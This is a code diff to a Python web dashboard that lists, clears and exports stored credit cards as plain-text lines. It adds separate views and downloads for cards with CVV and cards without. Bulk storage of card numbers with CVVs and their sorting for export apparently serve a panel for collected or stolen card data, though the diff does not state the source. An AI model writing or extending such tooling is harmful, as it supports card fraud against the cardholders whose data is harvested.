@@ -558,10 +558,14 @@ class Dashboard:
         async def get_credit_cards(request: Request, limit: int = 1000):
             self._require(request)
             limit = max(1, min(int(limit), 5000))
-            cards, total = await asyncio.to_thread(self.db.get_credit_cards, limit)
-            for card in cards:
-                card['line'] = format_credit_card_line(card)
-            return {'total': total, 'showing': len(cards), 'cards': cards}
+            split = await asyncio.to_thread(self.db.get_credit_cards_split, limit)
+            out = {}
+            for key, include_cvv in (('with_cvv', True), ('without_cvv', False)):
+                cards, total = split[key]
+                for card in cards:
+                    card['line'] = format_credit_card_line(card, include_cvv=include_cvv)
+                out[key] = {'total': total, 'showing': len(cards), 'cards': cards}
+            return out
 
         @self.app.post('/credit-cards/clear-all')
         async def clear_credit_cards(request: Request, csrf: str = Form(...)):
@@ -569,16 +573,28 @@ class Dashboard:
             count = await asyncio.to_thread(self.db.clear_all_credit_cards)
             return RedirectResponse(f'/?notice=Deleted+{count}+credit+cards', 303)
 
-        @self.app.get('/credit-cards/export')
-        async def export_credit_cards(request: Request):
+        @self.app.get('/credit-cards/export-with-cvv')
+        async def export_credit_cards_with_cvv(request: Request):
             self._require(request)
-            cards = await asyncio.to_thread(self.db.get_all_credit_cards)
-            lines = [format_credit_card_line(card) for card in cards]
+            cards = await asyncio.to_thread(lambda: self.db.get_all_credit_cards(with_cvv=True))
+            lines = [format_credit_card_line(card, include_cvv=True) for card in cards]
             content = '\n'.join(lines) + '\n' if lines else ''
             return Response(
                 content,
                 media_type='text/plain',
-                headers={'Content-Disposition': 'attachment; filename=credit-cards.txt'},
+                headers={'Content-Disposition': 'attachment; filename=credit-cards-with-cvv.txt'},
+            )
+
+        @self.app.get('/credit-cards/export-without-cvv')
+        async def export_credit_cards_without_cvv(request: Request):
+            self._require(request)
+            cards = await asyncio.to_thread(lambda: self.db.get_all_credit_cards(with_cvv=False))
+            lines = [format_credit_card_line(card, include_cvv=False) for card in cards]
+            content = '\n'.join(lines) + '\n' if lines else ''
+            return Response(
+                content,
+                media_type='text/plain',
+                headers={'Content-Disposition': 'attachment; filename=credit-cards-without-cvv.txt'},
             )
 
         @self.app.get('/session-regenerate')
